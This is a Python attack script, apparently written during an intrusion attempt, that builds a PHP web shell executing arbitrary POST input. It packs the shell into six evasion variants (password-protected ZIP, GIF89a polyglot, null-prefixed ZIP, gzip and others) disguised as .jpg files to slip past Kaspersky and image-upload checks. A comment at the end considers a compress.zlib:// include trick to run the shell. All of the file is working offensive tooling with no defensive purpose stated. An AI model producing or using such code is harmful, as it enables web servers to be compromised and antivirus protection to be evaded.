#!/usr/bin/env python3
"""Create ZIP variants to bypass Kaspersky."""
import zipfile, os, shutil

OUT = "/tmp/zip_attack"
os.makedirs(OUT, exist_ok=True)

# Create webshell file
with open(os.path.join(OUT, "shell.php"), "w") as f:
    f.write('<?php @eval($_POST["a"]);?>')

# 1. Password protected ZIP
with zipfile.ZipFile(os.path.join(OUT, "protected.zip"), "w", zipfile.ZIP_DEFLATED) as zf:
    zf.setpassword(b"pwd")
    zf.write(os.path.join(OUT, "shell.php"), "shell.php")
shutil.copy(os.path.join(OUT, "protected.zip"), os.path.join(OUT, "protected.jpg"))
print("Protected ZIP:", os.path.getsize(os.path.join(OUT, "protected.jpg")))

# 2. No compression
with zipfile.ZipFile(os.path.join(OUT, "nostore.zip"), "w", zipfile.ZIP_STORED) as zf:
    zf.write(os.path.join(OUT, "shell.php"), "shell.php")
shutil.copy(os.path.join(OUT, "nostore.zip"), os.path.join(OUT, "nostore.jpg"))
print("No compression:", os.path.getsize(os.path.join(OUT, "nostore.jpg")))

# 3. GIF89a + ZIP polyglot
poly_path = os.path.join(OUT, "polyglot.zip")
with open(poly_path, "wb") as f:
    f.write(b"GIF89a")
with zipfile.ZipFile(poly_path, "a", zipfile.ZIP_DEFLATED) as zf:
    zf.write(os.path.join(OUT, "shell.php"), "shell.php")
shutil.copy(poly_path, os.path.join(OUT, "polyglot.jpg"))
print("GIF89a+ZIP:", os.path.getsize(os.path.join(OUT, "polyglot.jpg")))

# 4. Different internal filename
with zipfile.ZipFile(os.path.join(OUT, "renamed.zip"), "w", zipfile.ZIP_DEFLATED) as zf:
    zf.write(os.path.join(OUT, "shell.php"), "a.php")
shutil.copy(os.path.join(OUT, "renamed.zip"), os.path.join(OUT, "renamed.jpg"))
print("Renamed internal:", os.path.getsize(os.path.join(OUT, "renamed.jpg")))

# 5. Empty prefix + ZIP
empty_path = os.path.join(OUT, "empty_prefix.zip")
with open(empty_path, "wb") as f:
    f.write(b"\x00" * 100)
with zipfile.ZipFile(empty_path, "a", zipfile.ZIP_DEFLATED) as zf:
    zf.write(os.path.join(OUT, "shell.php"), "shell.php")
shutil.copy(empty_path, os.path.join(OUT, "empty_prefix.jpg"))
print("Null prefix:", os.path.getsize(os.path.join(OUT, "empty_prefix.jpg")))

# 6. GZip compressed file
import gzip
with gzip.open(os.path.join(OUT, "shell.gz"), "wb") as f:
    f.write(b'<?php @eval($_POST["a"]);?>')
shutil.copy(os.path.join(OUT, "shell.gz"), os.path.join(OUT, "shellgz.jpg"))
print("GZip as JPG:", os.path.getsize(os.path.join(OUT, "shellgz.jpg")))
# Can we use compress.zlib:// or compress.zlib:// wrapper?
# include('compress.zlib://assets/img/upload/xxx.shellgz.jpg.php')
# But .php would be appended... hmm

print("\nAll variants ready")
